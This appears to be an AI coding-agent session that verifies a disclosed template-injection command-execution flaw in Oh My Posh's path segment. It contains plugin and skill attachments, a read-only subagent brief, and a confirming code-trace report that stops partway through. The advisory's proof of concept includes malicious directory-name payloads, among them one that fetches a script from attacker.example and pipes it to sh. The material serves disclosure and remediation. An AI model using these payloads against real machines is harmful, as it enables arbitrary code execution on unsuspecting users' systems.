content:
Investigate this using fable as a subagent accoridng to /code-changes 

Summary
Oh My Posh re-renders the resolved path string, which contains the raw folder names taken from the filesystem, through the Go `text/template` engine. That engine's function map exposes a `cmd` function that runs arbitrary OS commands. A directory whose name contains a Go template expression is therefore evaluated when the prompt renders, giving arbitrary command execution as the current user as soon as the shell is inside (or below) that directory. The built-in default configuration is affected.
Details
`src/segments/path.go`, `setStyle()`:

```
// make sure we resolve all templates
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```

`pt.Path` is built from the raw folder-name components of the current working directory (`colorizePath` inserts each folder name verbatim via `fmt.Sprintf(folderFormat, element)`). The whole string is then passed to `template.Render`, which parses and executes it with the full function map from `src/template/func_map.go`, including:

```
func cmd(command string, args ...string) (string, error) {
    output, err := env.RunCommand(command, args...)
    return strings.TrimSpace(output), err
}
```

Any template syntax present in an untrusted folder name is evaluated. The render runs after the path-style switch unconditionally, so every path style is affected, and the default config (`src/config/default.go`) contains a path segment.
PoC
Config (a single default path segment):

```
{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"path","style":"plain","foreground":"#ffffff",
   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
```

Command execution reflected into the prompt (`--pwd` supplies exactly the string `env.Pwd()` returns for a real directory of that name; on Linux/macOS such a directory is fully creatable, only `/` and NUL are disallowed):

```
$ oh-my-posh print primary --config p.json --shell fish \
      --pwd '/home/v/{{ cmd `whoami` }}'
/home/v/<username>        # whoami executed, output substituted

```

Side effect (file write), slash-free payload, verified on Windows:

```
$ RCE_OUT=/tmp/proof oh-my-posh print primary --config p.json --shell fish \
      --pwd '/home/v/{{ cmd `powershell` `-c` `sc $env:RCE_OUT pwn3d` }}'
$ cat /tmp/proof
pwn3d

```

Confirmed to fire under full, folder, agnoster, agnoster_short, mixed and letter path styles.
Impact
Arbitrary command execution as the victim user, triggered by navigating into attacker-supplied directory content: a subdirectory in a cloned repository, an extracted archive, a network share, or a removable drive. Execution occurs when the shell is in that directory or any descendant (the full path includes the ancestor names) and the prompt renders, i.e. on the next command after cd.
The path is split on `/` (and `\` on Windows) before rendering, so a payload cannot contain a path separator. This is not a real barrier: on Linux/macOS `{{ cmd `sh` `-c` `curl${IFS}-s${IFS}attacker.example|sh` }}` needs no slash (attacker root path), or a script staged in the same directory can be run with a relative name (`{{ cmd `bash` `x` }}`).
Suggested fix: do not re-parse the composed path as a template after untrusted folder names have been inserted. Preferably resolve configuration templates (`folder_separator_template`, `mapped_locations`, `folder_format`) individually against their own inputs and concatenate the already-rendered pieces with the literal folder names. Alternatively escape `{{`/`}}` in raw folder-name components before insertion, or use a data-only function map (no `cmd`/`readFile`/`stat`/`glob`) for path resolution. The same double-evaluation pattern is worth reviewing at `src/segments/options/map.go`.

attachment.content:
CAVEMAN MODE ACTIVE — level: full

Respond terse like smart caveman. All technical substance stay. Only fluff die.

## Persistence

ACTIVE EVERY RESPONSE. No revert after many turns. No filler drift. Still active if unsure. Off only: "stop caveman" / "normal mode".

Default: **full**. Switch: `/caveman lite|full|ultra`.

## Rules

Drop: articles (a/an/the), filler (just/really/basically/actually/simply), pleasantries (sure/certainly/of course/happy to), hedging. Fragments OK. Short synonyms (big not extensive, fix not "implement a solution for"). No tool-call narration, no decorative tables/emoji, no dumping long raw error logs unless asked — quote shortest decisive line. Standard well-known tech acronyms OK (DB/API/HTTP); never invent new abbreviations (cfg/impl/req/res/fn) — tokenizer split them same as full word: zero token saved, reader still decode. Full word cheaper AND clearer. No causal arrows (→) either — own token, save nothing. Technical terms exact. Code blocks unchanged. Errors quoted exact.

Preserve user's dominant language. User write Portuguese → reply Portuguese caveman. User write Spanish → reply Spanish caveman. Compress the style, not the language. No forced English openings or status phrases. ALWAYS keep technical terms, code, API names, CLI commands, commit-type keywords (feat/fix/...), and exact error strings verbatim — unless user explicitly ask for translation.

No self-reference. Never name or announce the style. No "caveman mode on", "me caveman think", no third-person caveman tags. Output caveman-only — never normal answer plus "Caveman:" recap. Exception: user explicitly ask what the mode is.

Pattern: `[thing] [action] [reason]. [next step].`

Not: "Sure! I'd be happy to help you with that. The issue you're experiencing is likely caused by..."
Yes: "Bug in auth middleware. Token expiry check use `<` not `<=`. Fix:"

## Intensity

| Level | What change |
|-------|------------|
| **full** | Drop articles, fragments OK, short synonyms. Classic caveman. No tool-call narration, no decorative tables/emoji, no long raw error-log dumps unless asked. Standard acronyms OK; no invented abbreviations |

Example — "Why React component re-render?"
- full: "New object ref each render. Inline object prop = new ref = re-render. Wrap in `useMemo`."

Example — "Explain database connection pooling."
- full: "Pool reuse open DB connections. No new connection per request. Skip handshake overhead."

## Auto-Clarity

Drop caveman when:
- Security warnings
- Irreversible action confirmations
- Multi-step sequences where fragment order or omitted conjunctions risk misread
- Compression itself creates technical ambiguity (e.g., `"migrate table drop column backup first"` — order unclear without articles/conjunctions)
- User asks to clarify or repeats question

Resume caveman after clear part done.

Example — destructive op:
> **Warning:** This will permanently delete all rows in the `users` table and cannot be undone.
> ```sql
> DROP TABLE users;
> ```
> Caveman resume. Verify backup exist first.

## Boundaries

Code/commits/PRs: write normal. "stop caveman" or "normal mode": revert. Level persist until changed or session end.

STATUSLINE SETUP NEEDED: The caveman plugin includes a statusline badge showing active mode (e.g. [CAVEMAN], [CAVEMAN:ULTRA]). It is not configured yet. To enable, add this to C:\Users\jande\.claude\settings.json: "statusLine": { "type": "command", "command": "powershell -ExecutionPolicy Bypass -File \"C:\\Users\\jande\\.claude\\plugins\\cache\\caveman\\caveman\\0d95a81d35a9\\src\\hooks\\caveman-statusline.ps1\"" } Proactively offer to set this up for the user on first interaction.

addedLines: - caveman:cavecrew-builder: Surgical 1-2 file edit. Typo fixes, single-function rewrites, mechanical renames, comment removal, format-preserving tweaks. Hard refuses 3+ file scope. Returns caveman diff receipt. Use when scope is bounded and obvious; do NOT use for new features, new files (unless asked), or cross-file refactors. (Tools: Read, Edit, Write, Grep, Glob)

- caveman:cavecrew-investigator: Read-only code locator. Returns file:line table for "where is X defined", "what calls Y", "list all uses of Z", "map this directory". Output is caveman-compressed so the main thread eats ~60% fewer tokens than vanilla Explore. Refuses to suggest fixes. (Tools: Read, Grep, Glob, Bash)

- caveman:cavecrew-reviewer: Diff/branch/file reviewer. One line per finding, severity-tagged, no praise, no scope creep. Output format `path:line: <emoji> <severity>: <problem>. <fix>.` Use for "review this PR", "review my diff", "audit this file". Skips formatting nits unless they change meaning. (Tools: Read, Grep, Bash)
- claude: Catch-all for any task that doesn't fit a more specific agent. FleetView's default when no agent name is typed. (Tools: *)

- claude-code-guide: Use this agent when the user asks questions ("Can Claude...", "Does Claude...", "How do I...") about: (1) Claude Code (the CLI tool) - features, hooks, slash commands, MCP servers, settings, IDE integrations, keyboard shortcuts; (2) Claude Agent SDK - building custom agents; (3) Claude API (formerly Anthropic API) - Messages API for directly passing messages to Claude, Tool Runner (`client.beta.messages.tool_runner`) for running an agentic loop over your own tools, manual tool-use loops, Managed Agents for server-hosted agents with a managed sandbox, prompt caching, and general Anthropic SDK usage; (4) Claude Tag (Claude in Slack) - what it is, setting it up for a Slack workspace, `/install-slack-app`. **IMPORTANT:** Before spawning a new agent, check if there is already a running or recently completed claude-code-guide agent that you can continue via SendMessage. (Tools: Glob, Grep, Read, WebFetch, WebSearch)

- compound-engineering:design:design-implementation-reviewer: Visually compares live UI implementation against Figma designs and provides detailed feedback on discrepancies. Use after writing or modifying HTML/CSS/React components to verify design fidelity. (Tools: All tools)

- compound-engineering:design:design-iterator: Iteratively refines UI design through N screenshot-analyze-improve cycles. Use PROACTIVELY when design changes aren't coming together after 1-2 attempts, or when user requests iterative refinement. (Tools: All tools)

- compound-engineering:design:figma-design-sync: Detects and fixes visual differences between a web implementation and its Figma design. Use iteratively when syncing implementation to match Figma specs. (Tools: All tools)

- compound-engineering:docs:ankane-readme-writer: Creates or updates README files following Ankane-style template for Ruby gems. Use when writing gem documentation with imperative voice, concise prose, and standard section ordering. (Tools: All tools)

- compound-engineering:research:best-practices-researcher: Researches and synthesizes external best practices, documentation, and examples for any technology or framework. Use when you need industry standards, community conventions, or implementation guidance. (Tools: All tools)

- compound-engineering:research:framework-docs-researcher: Gathers comprehensive documentation and best practices for frameworks, libraries, or dependencies. Use when you need official docs, version-specific constraints, or implementation patterns. (Tools: All tools)

- compound-engineering:research:git-history-analyzer: Performs archaeological analysis of git history to trace code evolution, identify contributors, and understand why code patterns exist. Use when you need historical context for code changes. (Tools: All tools)

- compound-engineering:research:issue-intelligence-analyst: Fetches and analyzes GitHub issues to surface recurring themes, pain patterns, and severity trends. Use when understanding a project's issue landscape, analyzing bug patterns for ideation, or summarizing what users are reporting. (Tools: All tools)

- compound-engineering:research:learnings-researcher: Searches docs/solutions/ for relevant past solutions by frontmatter metadata. Use before implementing features or fixing problems to surface institutional knowledge and prevent repeated mistakes. (Tools: All tools)

- compound-engineering:research:repo-research-analyst: Conducts thorough research on repository structure, documentation, conventions, and implementation patterns. Use when onboarding to a new codebase or understanding project conventions. (Tools: All tools)

- compound-engineering:review:agent-native-reviewer: Reviews code to ensure agent-native parity — any action a user can take, an agent can also take. Use after adding UI features, agent tools, or system prompts. (Tools: All tools)

- compound-engineering:review:architecture-strategist: Analyzes code changes from an architectural perspective for pattern compliance and design integrity. Use when reviewing PRs, adding services, or evaluating structural refactors. (Tools: All tools)

- compound-engineering:review:code-simplicity-reviewer: Final review pass to ensure code is as simple and minimal as possible. Use after implementation is complete to identify YAGNI violations and simplification opportunities. (Tools: All tools)

- compound-engineering:review:data-integrity-guardian: Reviews database migrations, data models, and persistent data code for safety. Use when checking migration safety, data constraints, transaction boundaries, or privacy compliance. (Tools: All tools)

- compound-engineering:review:data-migration-expert: Validates data migrations, backfills, and production data transformations against reality. Use when PRs involve ID mappings, column renames, enum conversions, or schema changes. (Tools: All tools)

- compound-engineering:review:deployment-verification-agent: Produces Go/No-Go deployment checklists with SQL verification queries, rollback procedures, and monitoring plans. Use when PRs touch production data, migrations, or risky data changes. (Tools: All tools)

- compound-engineering:review:dhh-rails-reviewer: Brutally honest Rails code review from DHH's perspective. Use when reviewing Rails code for anti-patterns, JS framework contamination, or violations of Rails conventions. (Tools: All tools)

- compound-engineering:review:julik-frontend-races-reviewer: Reviews JavaScript and Stimulus code for race conditions, timing issues, and DOM lifecycle problems. Use after implementing or modifying frontend controllers or async UI code. (Tools: All tools)

- compound-engineering:review:kieran-python-reviewer: Reviews Python code with an extremely high quality bar for Pythonic patterns, type safety, and maintainability. Use after implementing features, modifying code, or creating new Python modules. (Tools: All tools)

- compound-engineering:review:kieran-rails-reviewer: Reviews Rails code with an extremely high quality bar for conventions, clarity, and maintainability. Use after implementing features, modifying code, or creating new Rails components. (Tools: All tools)

- compound-engineering:review:kieran-typescript-reviewer: Reviews TypeScript code with an extremely high quality bar for type safety, modern patterns, and maintainability. Use after implementing features, modifying code, or creating new TypeScript components. (Tools: All tools)

- compound-engineering:review:pattern-recognition-specialist: Analyzes code for design patterns, anti-patterns, naming conventions, and duplication. Use when checking codebase consistency or verifying new code follows established patterns. (Tools: All tools)

- compound-engineering:review:performance-oracle: Analyzes code for performance bottlenecks, algorithmic complexity, database queries, memory usage, and scalability. Use after implementing features or when performance concerns arise. (Tools: All tools)

- compound-engineering:review:schema-drift-detector: Detects unrelated schema.rb changes in PRs by cross-referencing against included migrations. Use when reviewing PRs with database schema changes. (Tools: All tools)

- compound-engineering:review:security-sentinel: Performs security audits for vulnerabilities, input validation, auth/authz, hardcoded secrets, and OWASP compliance. Use when reviewing code for security issues or before deployment. (Tools: All tools)

- compound-engineering:workflow:bug-reproduction-validator: Systematically reproduces and validates bug reports to confirm whether reported behavior is an actual bug. Use when you receive a bug report or issue that needs verification. (Tools: All tools)
- compound-engineering:workflow:lint: Use this agent when you need to run linting and code quality checks on Ruby and ERB files. Run before pushing to origin. (Tools: All tools)

- compound-engineering:workflow:pr-comment-resolver: Addresses PR review comments by implementing requested changes and reporting resolutions. Use when code review feedback needs to be resolved with code changes. (Tools: All tools)

- compound-engineering:workflow:spec-flow-analyzer: Analyzes specifications and feature descriptions for user flow completeness and gap identification. Use when a spec, plan, or feature description needs flow analysis, edge case discovery, or requirements validation. (Tools: All tools)

- Explore: Fast read-only search agent for locating code. Use it to find files by pattern (eg. "src/components/**/*.tsx"), grep for symbols or keywords (eg. "API endpoints"), or answer "where is X defined / which files reference Y." Do NOT use it for code review, design-doc auditing, cross-file consistency checks, or open-ended analysis — it reads excerpts rather than whole files and will miss content past its read window. When calling, specify search breadth: "quick" for a single targeted lookup, "medium" for moderate exploration, or "very thorough" to search across multiple locations and naming conventions. (Tools: All tools except Agent, Artifact, ExitPlanMode, Edit, Write, NotebookEdit)

- general-purpose: General-purpose agent for researching complex questions, searching for code, and executing multi-step tasks. When you are searching for a keyword or file and are not confident that you will find the right match in the first few tries use this agent to perform the search for you. (Tools: *)

- Plan: Software architect agent for designing implementation plans. Use this when you need to plan the implementation strategy for a task. Returns step-by-step plans, identifies critical files, and considers architectural trade-offs. (Tools: All tools except Agent, Artifact, ExitPlanMode, Edit, Write, NotebookEdit)
- statusline-setup: Use this agent to configure the user's Claude Code status line setting. (Tools: Read, Edit)

attachment.content:
- context7-mcp: This skill should be used when the user asks about libraries, frameworks, API references, or needs code examples. Activates for setup questions, code generation involving libraries, or mentions of specific frameworks like React, Vue, Next.js, Prisma, Supabase, etc.
- ast-grep: Guide for writing ast-grep rules to perform structural code search and analysis. Use when users need to search codebases using Abstract Syntax Tree (AST) patterns, find specific code structures, or perform complex code queries that go beyond simple text search. This skill should be used when users ask to search for code patterns, find specific language constructs, or locate code with particular structural characteristics.
- code-changes: Orchestration workflow for any task that ends in code changes: issue analysis, pull request review, feature implementation, bug fixes, refactors, or fleshing out an idea. MUST be invoked at the start of such a task, before reading or writing any code. Defines how to analyze first, gate on user approval, plan, pick the right executor model, delegate and supervise subagents, verify, and deliver.
- conventional-commit: Workflow for generating conventional commit messages following the Conventional Commits specification. MUST be invoked every time a commit is created. Guides construction of standardized commit messages with correct type, scope, description, body, and footer.
- golang: Go coding standards and conventions for this project. Apply when writing, reviewing, or refactoring any Go source file.
- markdown: Markdown formatting rules for this project. Apply when writing or editing any .md or .mdx file, including documentation and website content.
- powershell: PowerShell cmdlet conventions for this project. Apply when writing or reviewing any .ps1 or module file.
- writing-clearly-and-concisely: Apply whenever writing content a human will read — emails, documents, reports, documentation, messages, UI copy, commit messages, explanations, or any other prose. Applies Strunk's timeless rules for clearer, stronger, more professional writing.
- deep-research: Deep research harness — fan-out web searches, fetch sources, adversarially verify claims, synthesize a cited report. - When the user wants a deep, multi-source, fact-checked research report on any topic. BEFORE invoking, check if the question is specific enough to research directly — if underspecified (e.g., "what car to buy" without budget/use-case/region), ask 2-3 clarifying questions to narrow scope. Then pass the refined question as args, weaving the answers in.
- caveman:caveman-commit: Generate terse caveman-style commit message
- caveman:caveman-init: Drop the always-on caveman activation rule into the current repo for every IDE agent
- caveman:caveman-review: One-line code review comments
- caveman:caveman-stats: Real session token usage + lifetime savings + USD. Tweetable line via --share.
- caveman:caveman: Switch caveman intensity level (lite/full/ultra/wenyan)
- caveman:cavecrew: Decision guide for delegating to caveman-style subagents. Tells the main thread WHEN to spawn `cavecrew-investigator` (locate code), `cavecrew-builder` (1-2 file edit), or `cavecrew-reviewer` (diff review) instead of doing the work inline or using vanilla `Explore`. Subagent output is caveman-compressed so the tool-result injected back into main context is ~60% smaller — main context lasts longer across long sessions. Trigger: "delegate to subagent", "use cavecrew", "spawn investigator/builder/reviewer", "save context", "compressed agent output".
- caveman:caveman-compress: Compress natural language memory files (CLAUDE.md, todos, preferences) into caveman format to save input tokens. Preserves all technical substance, code, URLs, and structure. Compressed version overwrites the original file. Human-readable backup saved as FILE.original.md. Trigger: /caveman-compress FILEPATH or "compress memory file"
- caveman:caveman-help: Quick-reference card for all caveman modes, skills, and commands. One-shot display, not a persistent mode. Trigger: /caveman-help, "caveman help", "what caveman commands", "how do I use caveman".
- compound-engineering:agent-browser: Browser automation CLI for AI agents. Use when the user needs to interact with websites, including navigating pages, filling forms, clicking buttons, taking screenshots, extracting data, testing web apps, or automating any browser task. Triggers include requests to "open a website", "fill out a form", "click a button", "take a screenshot", "scrape data from a page", "test this web app", "login to a site", "automate browser actions", or any task requiring programmatic web interaction.
- compound-engineering:agent-native-architecture: Build applications where agents are first-class citizens. Use this skill when designing autonomous agents, creating MCP tools, implementing self-modifying systems, or building apps where features are outcomes achieved by agents operating in a loop.
- compound-engineering:andrew-kane-gem-writer: This skill should be used when writing Ruby gems following Andrew Kane's proven patterns and philosophy. It applies when creating new Ruby gems, refactoring existing gems, designing gem APIs, or when clean, minimal, production-ready Ruby library code is needed. Triggers on requests like "create a gem", "write a Ruby library", "design a gem API", or mentions of Andrew Kane's style.
- compound-engineering:ce-brainstorm: Explore requirements and approaches through collaborative dialogue before writing a right-sized requirements document and planning implementation. Use for feature ideas, problem framing, when the user says 'let's brainstorm', or when they want to think through options before deciding what to build. Also use when a user describes a vague or ambitious feature request, asks 'what should we build', 'help me think through X', presents a problem with multiple valid solutions, or seems unsure about scope or direction — even if they don't explicitly ask to brainstorm.

- compound-engineering:ce-ideate: Generate and critically evaluate grounded improvement ideas for the current project. Use when asking what to improve, requesting idea generation, exploring surprising improvements, or wanting the AI to proactively suggest strong project directions before brainstorming one in depth. Triggers on phrases like 'what should I improve', 'give me ideas', 'ideate on this project', 'surprise me with improvements', 'what would you change', or any request for AI-generated project improvement suggestions rather than refining the user's own idea.

content.text:
Base directory for this skill: D:\oh-my-posh\.claude\skills\code-changes

# Code Changes

The workflow for going from an issue, pull request, idea, or feature request to shipped code.
Follow the phases in order. Analysis always comes first; code comes last.

Each phase has a reference file with the full instructions. **Read the reference file when you
enter the phase** — not before, and never skip it because the phase "looks obvious".

## Roles

Assign work based on model capability. The coordinator is not the strongest model — it's the one
that stays resident, owns every phase by default, and knows when it's out of its depth.

| Role        | Capability tier                                               | Owns                                                                          |
| ----------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| Coordinator | Capable mid-tier, resident for the whole task                | Analysis, plan, delegation, supervision, verification, delivery — by default |
| Escalation  | Strongest reasoning model available; invoked only on trigger | The specific judgment call the coordinator flagged, then control returns     |
| Implementer | Same tier as coordinator, or smaller for trivial edits        | Executing one pinned, self-contained task                                    |

Concrete model names per vendor (Anthropic, OpenAI, Google) and how to run the split in Claude
Code, GitHub Copilot, Codex, or IDE agents: [references/model-tiers.md](references/model-tiers.md).

When the current agent already runs at implementer tier, there's no separate delegation step for
standard work: plan and execute directly, still following every phase. Escalate to the strongest
model only when a trigger fires — see [references/escalate.md](references/escalate.md) — never by
default and never for a routine judgment call the coordinator is equipped to make itself.

## The flow

1. **Analyze** ([references/analyze.md](references/analyze.md)) — root cause and scope,
   validated against the code, never against the report alone.
2. **Plan** ([references/plan.md](references/plan.md)) — pinned spec, task split, parallel vs
   sequential, workspace per task.
3. **Delegate** ([references/delegate.md](references/delegate.md)) — match each task to the
   right executor, coordinator-tier by default.
4. **Supervise** ([references/supervise.md](references/supervise.md)) — monitor, unblock, and
   critically review implementer output.
5. **Verify** ([references/verify.md](references/verify.md)) — quality gates plus functional
   proof, never delegated downward.
6. **Deliver** ([references/deliver.md](references/deliver.md)) — conventional commits and an
   outcome-first report.

Analyze, Supervise, and Verify each carry an escalation checkpoint — see
[references/escalate.md](references/escalate.md) — for handing one specific judgment call to the
strongest available model without giving up ownership of the phase.

**Stop gate:** Phase 1 ends with reporting the analysis and proposed approach to the user and
waiting for a go. Skip the gate only when the user already gave the go in the request itself
("do it", "fix it and commit", "implement with Sonnet").

## Special cases

These entry points replace or extend Phase 1; the rest of the flow applies unchanged.

- Pull request review comments →
  [references/pr-review-comments.md](references/pr-review-comments.md)
- Issue triage → [references/issue-triage.md](references/issue-triage.md)

file.content:
# Phase 1 — Analyze

Start every task here, no matter how it arrived: issue link, PR number, verbal idea, bug report.
No code gets written or edited during this phase.

## Gather the full context

- Issues and PRs: `gh issue view <n> --comments` / `gh pr view <n> --comments`, plus linked
  issues, referenced discussions, and any code the report points at.
- Ideas and verbal requests: restate the goal and constraints in your own words. If the request
  is ambiguous, resolve the ambiguity now — not halfway through implementation.
- Check for prior art: existing helpers, similar segments/modules, and past commits that touched
  the same area (`git log -- <path>`).

## Reproduce before theorizing

Reproduce the problem when possible. A reproduction turns the analysis from a hypothesis into a
fact and gives Phase 5 its verification case for free. When reproduction is impossible (platform,
hardware, credentials), say so explicitly in the report and mark the fix as unverified-by-repro.

## Find the root cause in the code

- Read the actual implementation. Never reason from the issue text, a review comment, or a stack
  trace alone — reports and bot reviewers are frequently wrong.
- Distinguish the root cause from the symptom. Fixing where it crashes is not the same as fixing
  why it crashes.
- State what the change should be, which files it touches, and what it deliberately leaves alone.

## When to escalate

If root cause can't be pinned with confidence, or the fix looks architectural, security-sensitive,
or irreversible, hand the specific question to the strongest available model instead of guessing —
see [references/escalate.md](references/escalate.md). Resume ownership of the phase once the
question is answered.

## Output of this phase

A short analysis report to the user containing:

1. What is actually happening and why (root cause, with file references).
2. The proposed change and its scope.
3. What is intentionally out of scope.
4. Open questions, if any remain.

## Stop gate

Report the analysis and wait for a go before implementing. Skip the gate only when the user
already gave the go in the request itself ("do it", "fix it and commit", "implement with
Sonnet"). A go given for analysis is not a go for implementation.

content.content:
1	# Escalation triggers
2	
3	The coordinator owns every phase by default. Escalation is a bounded subagent call to the
4	strongest available model for one specific judgment call — not a handoff of the phase. The
5	coordinator frames the question, gets the answer, and stays the one accountable for the result.
6	
7	Escalate when one of these is actually true, not on a general feeling that the task is hard:
8	
9	- Root cause can't be pinned with confidence after actually reading the code — not after
10	  re-reading the report again.
11	- The change is architectural: it crosses a module boundary, touches a public API/interface, or
12	  introduces a cross-cutting abstraction.
13	- The code is security-, auth-, crypto-, payments-, or data-migration-sensitive.
14	- The operation is irreversible or high-blast-radius (schema migration, deletion, force-push,
15	  production config).
16	- An implementer has reported a spec gap or contradiction more than once on the same task.
17	- Reviewing a diff leaves the coordinator unsure whether the fix is correct or merely plausible.
18	- The user explicitly asked for a second opinion or an adversarial review.
19	
20	None of these fire on routine work. Most tasks should complete without ever calling Escalation
21	tier — the coordinator is capable enough to do the analysis, review, and verification itself, and
22	the strongest model gets paid for only on the calls that actually need it.
23	
24	## How to escalate
25	
26	Frame the specific question, not the whole task. Hand over the pinned context needed to answer
27	it — the relevant code, the hypothesis so far, why it's uncertain — get the answer, and resume
28	the phase. Escalation never becomes the new owner of the task, and it never decides scope; it
29	answers the question it was asked and returns control to the coordinator.
30

# Escalation triggers

The coordinator owns every phase by default. Escalation is a bounded subagent call to the
strongest available model for one specific judgment call — not a handoff of the phase. The
coordinator frames the question, gets the answer, and stays the one accountable for the result.

Escalate when one of these is actually true, not on a general feeling that the task is hard:

- Root cause can't be pinned with confidence after actually reading the code — not after
  re-reading the report again.
- The change is architectural: it crosses a module boundary, touches a public API/interface, or
  introduces a cross-cutting abstraction.
- The code is security-, auth-, crypto-, payments-, or data-migration-sensitive.
- The operation is irreversible or high-blast-radius (schema migration, deletion, force-push,
  production config).
- An implementer has reported a spec gap or contradiction more than once on the same task.
- Reviewing a diff leaves the coordinator unsure whether the fix is correct or merely plausible.
- The user explicitly asked for a second opinion or an adversarial review.

None of these fire on routine work. Most tasks should complete without ever calling Escalation
tier — the coordinator is capable enough to do the analysis, review, and verification itself, and
the strongest model gets paid for only on the calls that actually need it.

## How to escalate

Frame the specific question, not the whole task. Hand over the pinned context needed to answer
it — the relevant code, the hypothesis so far, why it's uncertain — get the answer, and resume
the phase. Escalation never becomes the new owner of the task, and it never decides scope; it
answers the question it was asked and returns control to the coordinator.

input.description: Verify template-injection RCE report
input.prompt:
Repo: D:\oh-my-posh (Go project, oh-my-posh prompt engine). Read-only investigation only — do NOT edit any files.

A security report claims: the resolved path string in the path segment is rendered through Go's text/template engine AFTER untrusted folder names (from the real filesystem / cwd) have been spliced into it, and the template func map includes a `cmd` function that executes arbitrary OS commands. So a directory literally named e.g. `{{ cmd `whoami` }}` gets its name evaluated as a template and executes code when the prompt renders. Claimed to affect the default config since it includes a path segment.

Report's cited evidence:
1. `src/segments/path.go`, function `setStyle()`, contains:
```go
// make sure we resolve all templates
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```
2. `pt.Path` is built by `colorizePath` which inserts each folder name verbatim via `fmt.Sprintf(folderFormat, element)` — folder names come straight from the filesystem/cwd, attacker-controlled if attacker controls a directory name (repo checkout, extracted archive, USB drive, network share).
3. `src/template/func_map.go` exposes `cmd(command string, args ...string) (string, error)` in the function map used by `template.Render`, which shells out via `env.RunCommand`.
4. Claims this fires under path styles: full, folder, agnoster, agnoster_short, mixed, letter.
5. Also flags `src/segments/options/map.go` as having a "similar double-evaluation pattern" worth reviewing.
6. Suggested fix directions: don't re-parse the already-composed path (with untrusted folder names already inserted) as a template; instead render the *configured* templates (folder_separator_template, mapped_locations, folder_format) individually against their own inputs and concatenate literal folder names afterward — OR escape `{{`/`}}` in raw folder-name components before insertion — OR use a restricted/data-only function map (no cmd/readFile/stat/glob) for this particular render pass.

Your job — verify this claim is real by reading the actual code, don't trust the report text alone:

1. Open src/segments/path.go and find setStyle() (or wherever pt.Path is finalized) and colorizePath (or equivalent) — confirm whether pt.Path really does get raw folder-name components spliced in via fmt.Sprintf, and whether template.Render really is called on the fully composed path afterward, unconditionally, regardless of path style.
2. Open src/template/func_map.go and confirm the func map used by template.Render includes cmd (and note any other dangerous functions like readFile/stat/glob if present) and that this is the SAME func map / Render call path used for path.go's re-render (not some separate sandboxed renderer).
3. Open src/config/default.go and confirm it defines a path segment, and what template it uses for that segment (does template like "{{ .Path }}" also trigger the internal template.Render call in path.go, or is the vulnerable render independent of the segment's own configured template?).
4. Open src/segments/options/map.go and check if it has an analogous pattern: untrusted external data (e.g. environment/options) spliced into a string that's then passed to template.Render with the full dangerous func map.
5. Trace how pt.Path's origin path components actually get their values — is it truly straight from env.Pwd()/filesystem walk with zero sanitization, or is there any escaping/validation you find that the report missed?
6. Note any git history/commits/existing issues that may be relevant (git log -- src/segments/path.go, git log --all --grep for template/path security).

Report back (this is analysis only, not a fix):
- CONFIRMED or NOT CONFIRMED for the core claim (untrusted folder name reaches template.Render with the cmd-capable func map), with exact file:line citations for each step of the chain.
- Whether it really fires unconditionally across path styles as claimed, or only certain styles/config shapes.
- Status of the options/map.go secondary claim (confirmed similar pattern, different pattern, or not applicable).
- Your own read on root cause: is the actual defect "path.go re-renders an already-composed string as a template" or something narrower/broader than that framing?
- Any other files/call sites you find during this trace that touch the same vulnerable pattern, so scope is accurate.
- Keep this to a focused technical report, cite file:line throughout, no code changes.

content.text:
I have fully traced the chain. Here is my technical report.

## VERDICT: CONFIRMED

The core claim is real. An untrusted folder name reaches `template.Render` with the full `cmd`-capable func map, and the render is unconditional across all path styles.

## The vulnerable chain (exact citations)

1. **Untrusted input enters** — `src/segments/path.go:185` `pt.pwd = pt.env.Pwd()` takes the real cwd from the filesystem. (PSWD override at :186-188 is equally untrusted.)

2. **Split, with only chevron escaping** — `src/segments/path.go:195-196` calls `replaceMappedLocations`, whose `escape` closure (`src/segments/path.go:702-705`) replaces only `<`→`<<>` and `>`→`<>>`. It does **not** touch `{{` / `}}`. Template braces survive intact.

3. **Folder names stored raw** — `splitPath` (`src/segments/path.go:951-984`) sets each `Folder.Name` to the raw path element (`:976`); no brace sanitization anywhere.

4. **Verbatim splice into `pt.Path`** — every style function funnels into `colorizePath`, where `src/segments/path.go:941` does `fmt.Sprintf(format, element)` with `folderFormat` defaulting to `"%s"` (`:884`). The folder name is inserted verbatim. (`getFullPath` :611-613, `getAgnosterFullPath` :578-582, `getFolderPath` :615-618, mixed/letter/agnoster/short all reach `colorizePath`.)

5. **Unconditional re-render** — `src/segments/path.go:285`:
   ```go
   if txt, err := template.Render(pt.Path, pt); err == nil {
       pt.Path = txt
   }
   ```
   This sits **after** the entire `switch` (`:255-282`), so it runs for every style. Introduced by commit `b88ffc8d` "feat(path): allow templating" (resolves #6279) — the intent was to resolve template syntax coming from config options (separator/mapped-location templates), but it re-parses the whole composed string including inlined folder names.

6. **Same shared, dangerous func map** — `template.Render` → `render.go:95` builds the template with `funcMap()`, the single shared map from `src/template/func_map.go:12-56`. It includes `"cmd": cmd` (`:28`), plus `readFile` (:29), `stat` (:30), `glob` (:15/:20 region), `readFile`, and all of sprig. There is **no** separate sandboxed renderer for path.go — it is the identical call path used everywhere.

7. **Execution** — `src/template/cmd.go:5-8`: `cmd` calls `env.RunCommand(command, args...)`. `readFile` (`files.go:19-22`) and `stat`/`glob` (`files.go:11-32`) provide arbitrary file read / lookup as well.

**Trigger gate:** `src/template/text.go:36` — `Render` short-circuits unless the string contains both `{{` and `}}`. So a normal path is untouched; the payload only fires when a directory name literally contains `{{ ... }}`. A dir named ``{{ cmd `whoami` }}`` (backticks work on Windows too; `/` is the only universally-forbidden char) satisfies the gate and executes on the next prompt render.

## Fires unconditionally across styles — yes

Line 285 is style-independent. What differs per style is only *which* folder names land in `pt.Path`:
- **folder** (the default config's style, `src/config/default.go:55-56`): only the current directory's own name (`getFolderPath` :616). So merely `cd`-ing into a maliciously named dir triggers it.
- **full / agnoster / agnoster_full / agnoster_short / mixed / letter / unique / fish / etc.**: any ancestor folder name in the displayed path.

The report's list (full, folder, agnoster, agnoster_short, mixed, letter) is accurate; it's actually every style.

## Default config affected — CONFIRMED

